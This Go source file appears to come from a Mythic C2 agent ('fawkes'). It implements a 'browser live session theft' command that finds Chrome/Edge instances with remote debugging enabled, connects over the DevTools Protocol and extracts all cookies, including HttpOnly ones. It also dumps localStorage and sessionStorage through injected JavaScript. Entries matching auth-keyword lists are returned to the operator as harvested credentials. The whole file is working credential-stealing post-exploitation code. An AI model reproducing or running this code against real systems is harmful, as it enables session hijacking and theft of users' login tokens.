package commands

import (
	"bufio"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// credBrowserLive connects to running Chrome/Edge instances via the Chrome DevTools
// Protocol (CDP) and extracts live cookies, localStorage, and sessionStorage.
// Unlike static database extraction (browser command), this captures live session
// data including HttpOnly cookies that are inaccessible to JavaScript.
func credBrowserLive(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder
	var creds []structs.MythicCredential

	sb.WriteString("Browser Live Session Theft (CDP)\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	// Discover browsers with remote debugging enabled
	targets := findCDPBrowsers()
	if len(targets) == 0 {
		sb.WriteString("No debuggable browsers found.\n\n")
		sb.WriteString("Chrome/Edge must be running with remote debugging enabled.\n")
		sb.WriteString("The browser writes a DevToolsActivePort file when started with:\n")
		sb.WriteString("  --remote-debugging-port=0\n\n")
		sb.WriteString("Checked locations:\n")
		paths := browserPaths("all")
		for browser, dir := range paths {
			if isFirefoxBrowser(browser) {
				continue
			}
			portFile := filepath.Join(dir, "DevToolsActivePort")
			sb.WriteString(fmt.Sprintf("  %s: %s — not found\n", browser, portFile))
		}
		return structs.CommandResult{
			Output:    sb.String(),
			Status:    "error",
			Completed: true,
		}
	}

	totalCookies := 0
	totalAuthCookies := 0
	totalStorageEntries := 0

	for _, target := range targets {
		sb.WriteString(fmt.Sprintf("--- %s (port %d) ---\n\n", target.Browser, target.Port))

		// Get list of debuggable page targets
		pages, err := cdpListTargets(target.Port)
		if err != nil {
			sb.WriteString(fmt.Sprintf("  Error listing targets: %s\n\n", err))
			continue
		}

		// Extract cookies (only need one connection for all cookies)
		if len(pages) > 0 {
			cookies, err := cdpGetAllCookies(pages[0].WebSocketURL)
			if err != nil {
				sb.WriteString(fmt.Sprintf("  Cookie extraction error: %s\n\n", err))
			} else {
				authCookies := filterAuthCookies(cookies)
				totalCookies += len(cookies)
				totalAuthCookies += len(authCookies)

				sb.WriteString(fmt.Sprintf("  Cookies: %d total, %d auth-related\n", len(cookies), len(authCookies)))

				// Show auth cookies in detail
				for _, c := range authCookies {
					expires := "session"
					if c.Expires > 0 {
						expires = time.Unix(int64(c.Expires), 0).Format("2006-01-02")
					}
					flags := cookieFlags(c)
					sb.WriteString(fmt.Sprintf("    [AUTH] %s: %s = %s (%s, exp %s)\n",
						c.Domain, c.Name, truncateValue(c.Value, 40), flags, expires))

					creds = append(creds, structs.MythicCredential{
						CredentialType: "plaintext",
						Realm:          strings.TrimPrefix(c.Domain, "."),
						Account:        c.Name,
						Credential:     c.Value,
						Comment:        fmt.Sprintf("cred-harvest browser-live (cookie, %s)", target.Browser),
					})
				}
				sb.WriteString("\n")
			}
		}

		// Extract localStorage and sessionStorage from each page
		sb.WriteString("  Local/Session Storage:\n")
		storageFound := false

		for _, page := range pages {
			if page.Type != "page" {
				continue
			}

			local, sessStorage, err := cdpGetStorage(page.WebSocketURL)
			if err != nil {
				continue
			}

			if len(local) > 0 || len(sessStorage) > 0 {
				storageFound = true
				sb.WriteString(fmt.Sprintf("    %s\n", truncateValue(page.URL, 60)))
			}

			for key, val := range local {
				totalStorageEntries++
				if isAuthStorageKey(key) {
					sb.WriteString(fmt.Sprintf("      [LS] %s = %s\n", key, truncateValue(val, 50)))
					origin := extractOrigin(page.URL)
					creds = append(creds, structs.MythicCredential{
						CredentialType: "plaintext",
						Realm:          origin,
						Account:        key,
						Credential:     val,
						Comment:        fmt.Sprintf("cred-harvest browser-live (localStorage, %s)", target.Browser),
					})
				}
			}

			for key, val := range sessStorage {
				totalStorageEntries++
				if isAuthStorageKey(key) {
					sb.WriteString(fmt.Sprintf("      [SS] %s = %s\n", key, truncateValue(val, 50)))
					origin := extractOrigin(page.URL)
					creds = append(creds, structs.MythicCredential{
						CredentialType: "plaintext",
						Realm:          origin,
						Account:        key,
						Credential:     val,
						Comment:        fmt.Sprintf("cred-harvest browser-live (sessionStorage, %s)", target.Browser),
					})
				}
			}
		}

		if !storageFound {
			sb.WriteString("    (no auth-related storage entries found)\n")
		}

		// List open tabs
		sb.WriteString(fmt.Sprintf("\n  Open Tabs (%d):\n", len(pages)))
		for i, page := range pages {
			if page.Type != "page" {
				continue
			}
			if i >= 20 {
				sb.WriteString(fmt.Sprintf("    ... and %d more\n", len(pages)-20))
				break
			}
			title := page.Title
			if len(title) > 50 {
				title = title[:47] + "..."
			}
			sb.WriteString(fmt.Sprintf("    %s — %s\n", truncateValue(page.URL, 60), title))
		}
		sb.WriteString("\n")
	}

	// Summary
	sb.WriteString(strings.Repeat("=", 60) + "\n")
	sb.WriteString(fmt.Sprintf("Summary: %d cookies (%d auth), %d storage entries, %d credentials extracted\n",
		totalCookies, totalAuthCookies, totalStorageEntries, len(creds)))

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(creds) > 0 {
		result.Credentials = &creds
	}
	return result
}

// --- Browser discovery ---

type cdpBrowserTarget struct {
	Browser string
	Port    int
}

// findCDPBrowsers discovers Chrome/Edge instances with remote debugging enabled.
func findCDPBrowsers() []cdpBrowserTarget {
	var targets []cdpBrowserTarget
	seen := make(map[int]bool)

	// Strategy 1: Check DevToolsActivePort files in browser user data directories
	paths := browserPaths("all")
	for browser, dataDir := range paths {
		if isFirefoxBrowser(browser) {
			continue // Firefox doesn't support CDP
		}
		port := readDevToolsActivePort(filepath.Join(dataDir, "DevToolsActivePort"))
		if port > 0 && !seen[port] {
			// Verify the port is actually responding
			if verifyCDPPort(port) {
				targets = append(targets, cdpBrowserTarget{Browser: browser, Port: port})
				seen[port] = true
			}
		}
	}

	// Strategy 2: Probe common debug ports if nothing found via files
	if len(targets) == 0 {
		for _, port := range []int{9222, 9223, 9224, 9225, 9229} {
			if seen[port] {
				continue
			}
			if verifyCDPPort(port) {
				targets = append(targets, cdpBrowserTarget{Browser: "Unknown", Port: port})
				seen[port] = true
			}
		}
	}

	return targets
}

// readDevToolsActivePort reads the debug port from Chrome's DevToolsActivePort file.
// Format: first line is the port number, second line is the browser target path.
func readDevToolsActivePort(path string) int {
	data, err := os.ReadFile(path)
	if err != nil {
		return 0
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(lines) == 0 {
		return 0
	}
	port, err := strconv.Atoi(strings.TrimSpace(lines[0]))
	if err != nil || port <= 0 || port > 65535 {
		return 0
	}
	return port
}

// verifyCDPPort checks if a port has a CDP endpoint by requesting /json/version.
func verifyCDPPort(port int) bool {
	client := &http.Client{Timeout: 2 * time.Second}
	resp, err := client.Get(fmt.Sprintf("http://127.0.0.1:%d/json/version", port))
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == 200
}

// --- CDP target listing ---

type cdpPageTarget struct {
	ID           string `json:"id"`
	Type         string `json:"type"`
	Title        string `json:"title"`
	URL          string `json:"url"`
	WebSocketURL string `json:"webSocketDebuggerUrl"`
}

// cdpListTargets retrieves the list of debuggable targets from a CDP endpoint.
func cdpListTargets(port int) ([]cdpPageTarget, error) {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(fmt.Sprintf("http://127.0.0.1:%d/json", port))
	if err != nil {
		return nil, fmt.Errorf("list targets: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read target list: %w", err)
	}

	var targets []cdpPageTarget
	if err := json.Unmarshal(body, &targets); err != nil {
		return nil, fmt.Errorf("parse target list: %w", err)
	}

	// Sort pages first, then others
	sort.SliceStable(targets, func(i, j int) bool {
		if targets[i].Type == "page" && targets[j].Type != "page" {
			return true
		}
		return false
	})

	return targets, nil
}

// --- Minimal WebSocket client (RFC 6455) ---

type wsConn struct {
	conn   net.Conn
	reader *bufio.Reader
}

// wsDial performs a WebSocket handshake and returns a connection.
func wsDial(wsURL string) (*wsConn, error) {
	// Parse ws://host:port/path
	if !strings.HasPrefix(wsURL, "ws://") {
		return nil, fmt.Errorf("unsupported WebSocket scheme: %s", wsURL)
	}
	urlPart := wsURL[5:] // strip "ws://"
	slashIdx := strings.Index(urlPart, "/")
	host := urlPart
	path := "/"
	if slashIdx >= 0 {
		host = urlPart[:slashIdx]
		path = urlPart[slashIdx:]
	}

	conn, err := net.DialTimeout("tcp", host, 5*time.Second)
	if err != nil {
		return nil, fmt.Errorf("dial %s: %w", host, err)
	}

	// Generate random WebSocket key
	keyBytes := make([]byte, 16)
	if _, err := rand.Read(keyBytes); err != nil {
		conn.Close()
		return nil, fmt.Errorf("generate ws key: %w", err)
	}
	key := base64.StdEncoding.EncodeToString(keyBytes)

	// Send HTTP upgrade request
	req := "GET " + path + " HTTP/1.1\r\n" +
		"Host: " + host + "\r\n" +
		"Upgrade: websocket\r\n" +
		"Connection: Upgrade\r\n" +
		"Sec-WebSocket-Key: " + key + "\r\n" +
		"Sec-WebSocket-Version: 13\r\n\r\n"

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write([]byte(req)); err != nil {
		conn.Close()
		return nil, fmt.Errorf("send upgrade: %w", err)
	}

	// Read response
	reader := bufio.NewReader(conn)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	statusLine, err := reader.ReadString('\n')
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("read status: %w", err)
	}
	if !strings.Contains(statusLine, "101") {
		conn.Close()
		return nil, fmt.Errorf("upgrade rejected: %s", strings.TrimSpace(statusLine))
	}

	// Consume remaining headers
	for {
		line, err := reader.ReadString('\n')
		if err != nil || strings.TrimSpace(line) == "" {
			break
		}
	}

	conn.SetDeadline(time.Time{}) // clear deadlines
	return &wsConn{conn: conn, reader: reader}, nil
}

// wsWriteText sends a text frame with client masking (RFC 6455 requirement).
func (w *wsConn) wsWriteText(data []byte) error {
	length := len(data)
	var header []byte

	// FIN + text opcode
	header = append(header, 0x81)

	// Length + mask bit
	switch {
	case length <= 125:
		header = append(header, byte(length)|0x80)
	case length <= 65535:
		header = append(header, 126|0x80, byte(length>>8), byte(length&0xff))
	default:
		header = append(header, 127|0x80)
		lenBytes := make([]byte, 8)
		binary.BigEndian.PutUint64(lenBytes, uint64(length))
		header = append(header, lenBytes...)
	}

	// 4-byte mask key
	mask := make([]byte, 4)
	rand.Read(mask)
	header = append(header, mask...)

	// Mask payload
	masked := make([]byte, length)
	for i := range data {
		masked[i] = data[i] ^ mask[i%4]
	}

	w.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if _, err := w.conn.Write(header); err != nil {
		return err
	}
	_, err := w.conn.Write(masked)
	return err
}

// wsReadFrame reads a single WebSocket frame.
func (w *wsConn) wsReadFrame() ([]byte, int, error) {
	w.conn.SetReadDeadline(time.Now().Add(15 * time.Second))

	hdr := make([]byte, 2)
	if _, err := io.ReadFull(w.reader, hdr); err != nil {
		return nil, 0, err
	}

	opcode := int(hdr[0] & 0x0f)
	masked := hdr[1]&0x80 != 0
	length := uint64(hdr[1] & 0x7f)

	switch length {
	case 126:
		ext := make([]byte, 2)
		if _, err := io.ReadFull(w.reader, ext); err != nil {
			return nil, opcode, err
		}
		length = uint64(binary.BigEndian.Uint16(ext))
	case 127:
		ext := make([]byte, 8)
		if _, err := io.ReadFull(w.reader, ext); err != nil {
			return nil, opcode, err
		}
		length = binary.BigEndian.Uint64(ext)
	}

	// Safety limit: 16MB
	if length > 16*1024*1024 {
		return nil, opcode, fmt.Errorf("frame too large: %d bytes", length)
	}

	var maskKey []byte
	if masked {
		maskKey = make([]byte, 4)
		if _, err := io.ReadFull(w.reader, maskKey); err != nil {
			return nil, opcode, err
		}
	}

	payload := make([]byte, length)
	if length > 0 {
		if _, err := io.ReadFull(w.reader, payload); err != nil {
			return nil, opcode, err
		}
	}

	if masked {
		for i := range payload {
			payload[i] ^= maskKey[i%4]
		}
	}

	return payload, opcode, nil
}

func (w *wsConn) close() {
	// Send close frame (opcode 8)
	w.conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	closeFrame := []byte{0x88, 0x80, 0, 0, 0, 0} // FIN+close, masked, zero mask
	w.conn.Write(closeFrame)
	w.conn.Close()
}

// --- CDP protocol layer ---

type cdpClient struct {
	ws    *wsConn
	msgID int
}

type cdpResponse struct {
	ID     int             `json:"id"`
	Result json.RawMessage `json:"result"`
	Error  *cdpError       `json:"error"`
}

type cdpError struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
}

func newCDPClient(wsURL string) (*cdpClient, error) {
	ws, err := wsDial(wsURL)
	if err != nil {
		return nil, err
	}
	return &cdpClient{ws: ws}, nil
}

func (c *cdpClient) close() {
	c.ws.close()
}

// send sends a CDP command and waits for the matching response.
func (c *cdpClient) send(method string, params map[string]interface{}) (json.RawMessage, error) {
	c.msgID++
	msg := map[string]interface{}{
		"id":     c.msgID,
		"method": method,
	}
	if params != nil {
		msg["params"] = params
	}

	data, err := json.Marshal(msg)
	if err != nil {
		return nil, fmt.Errorf("marshal CDP message: %w", err)
	}

	if err := c.ws.wsWriteText(data); err != nil {
		return nil, fmt.Errorf("send CDP message: %w", err)
	}

	// Read frames until we get our response ID (skip events)
	expectedID := c.msgID
	for i := 0; i < 100; i++ { // safety limit
		frame, opcode, err := c.ws.wsReadFrame()
		if err != nil {
			return nil, fmt.Errorf("read CDP response: %w", err)
		}

		if opcode == 8 { // close
			return nil, fmt.Errorf("WebSocket closed by browser")
		}
		if opcode != 1 { // not text
			continue
		}

		var resp cdpResponse
		if err := json.Unmarshal(frame, &resp); err != nil {
			continue // skip malformed frames
		}

		if resp.ID == expectedID {
			if resp.Error != nil {
				return nil, fmt.Errorf("CDP error %d: %s", resp.Error.Code, resp.Error.Message)
			}
			return resp.Result, nil
		}
		// Otherwise it's an event or a response to a different message — skip
	}

	return nil, fmt.Errorf("CDP response timeout (message %d)", expectedID)
}

// --- Cookie extraction ---

type cdpCookie struct {
	Name     string  `json:"name"`
	Value    string  `json:"value"`
	Domain   string  `json:"domain"`
	Path     string  `json:"path"`
	Expires  float64 `json:"expires"`
	Size     int     `json:"size"`
	HTTPOnly bool    `json:"httpOnly"`
	Secure   bool    `json:"secure"`
	SameSite string  `json:"sameSite"`
	Session  bool    `json:"session"`
}

// cdpGetAllCookies extracts all cookies via CDP Network.getAllCookies.
func cdpGetAllCookies(wsURL string) ([]cdpCookie, error) {
	client, err := newCDPClient(wsURL)
	if err != nil {
		return nil, err
	}
	defer client.close()

	result, err := client.send("Network.getAllCookies", nil)
	if err != nil {
		return nil, err
	}

	var cookieResult struct {
		Cookies []cdpCookie `json:"cookies"`
	}
	if err := json.Unmarshal(result, &cookieResult); err != nil {
		return nil, fmt.Errorf("parse cookies: %w", err)
	}

	return cookieResult.Cookies, nil
}

// authCookieNames are cookie names commonly associated with authentication sessions.
var authCookieNames = []string{
	"session", "sess", "sid", "token", "auth", "jwt", "access_token",
	"refresh_token", "id_token", "csrf", "xsrf", "_gh_sess", "connect.sid",
	"saml", "sso", "oidc", "oauth", "bearer", "api_key", "apikey",
	"phpsessid", "jsessionid", "asp.net_sessionid", "laravel_session",
	"wordpress_logged_in", "wp-settings", "__stripe", "cognito",
}

// filterAuthCookies returns cookies whose names match common auth patterns.
func filterAuthCookies(cookies []cdpCookie) []cdpCookie {
	var auth []cdpCookie
	for _, c := range cookies {
		if isAuthCookie(c.Name) {
			auth = append(auth, c)
		}
	}
	return auth
}

// isAuthCookie checks if a cookie name matches auth-related patterns.
func isAuthCookie(name string) bool {
	lower := strings.ToLower(name)
	for _, pattern := range authCookieNames {
		if strings.Contains(lower, pattern) {
			return true
		}
	}
	return false
}

func cookieFlags(c cdpCookie) string {
	var flags []string
	if c.HTTPOnly {
		flags = append(flags, "HttpOnly")
	}
	if c.Secure {
		flags = append(flags, "Secure")
	}
	if c.SameSite != "" {
		flags = append(flags, "SameSite="+c.SameSite)
	}
	if len(flags) == 0 {
		return "none"
	}
	return strings.Join(flags, ", ")
}

// --- Storage extraction ---

// cdpGetStorage extracts localStorage and sessionStorage from a page via Runtime.evaluate.
func cdpGetStorage(wsURL string) (local map[string]string, session map[string]string, err error) {
	client, err := newCDPClient(wsURL)
	if err != nil {
		return nil, nil, err
	}
	defer client.close()

	local = cdpEvalStorage(client, "localStorage")
	session = cdpEvalStorage(client, "sessionStorage")

	return local, session, nil
}

// cdpEvalStorage evaluates a JavaScript expression to extract storage entries.
func cdpEvalStorage(client *cdpClient, storageType string) map[string]string {
	expr := fmt.Sprintf(`(function() {
		try {
			var s = window.%s;
			if (!s || s.length === 0) return "{}";
			var obj = {};
			for (var i = 0; i < s.length; i++) {
				var k = s.key(i);
				var v = s.getItem(k);
				if (v && v.length < 4096) obj[k] = v;
			}
			return JSON.stringify(obj);
		} catch(e) { return "{}"; }
	})()`, storageType)

	result, err := client.send("Runtime.evaluate", map[string]interface{}{
		"expression":    expr,
		"returnByValue": true,
	})
	if err != nil {
		return nil
	}

	var evalResult struct {
		Result struct {
			Type  string `json:"type"`
			Value string `json:"value"`
		} `json:"result"`
	}
	if err := json.Unmarshal(result, &evalResult); err != nil {
		return nil
	}

	entries := make(map[string]string)
	json.Unmarshal([]byte(evalResult.Result.Value), &entries)
	return entries
}

// authStorageKeyPatterns are patterns for localStorage/sessionStorage keys that likely contain auth data.
var authStorageKeyPatterns = []string{
	"token", "auth", "session", "jwt", "access", "refresh", "bearer",
	"api_key", "apikey", "credential", "secret", "oauth", "oidc",
	"saml", "sso", "csrf", "xsrf", "id_token", "cognito",
}

// isAuthStorageKey checks if a storage key matches auth-related patterns.
func isAuthStorageKey(key string) bool {
	lower := strings.ToLower(key)
	for _, pattern := range authStorageKeyPatterns {
		if strings.Contains(lower, pattern) {
			return true
		}
	}
	return false
}

// --- Helpers ---

// truncateValue truncates a string to maxLen, appending "..." if truncated.
func truncateValue(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

// extractOrigin extracts the origin (scheme://host) from a URL.
func extractOrigin(rawURL string) string {
	// Find the scheme
	schemeEnd := strings.Index(rawURL, "://")
	if schemeEnd < 0 {
		return rawURL
	}
	rest := rawURL[schemeEnd+3:]
	// Find end of host (first / or end)
	hostEnd := strings.IndexAny(rest, "/?#")
	if hostEnd < 0 {
		return rawURL
	}
	return rawURL[:schemeEnd+3+hostEnd]
}
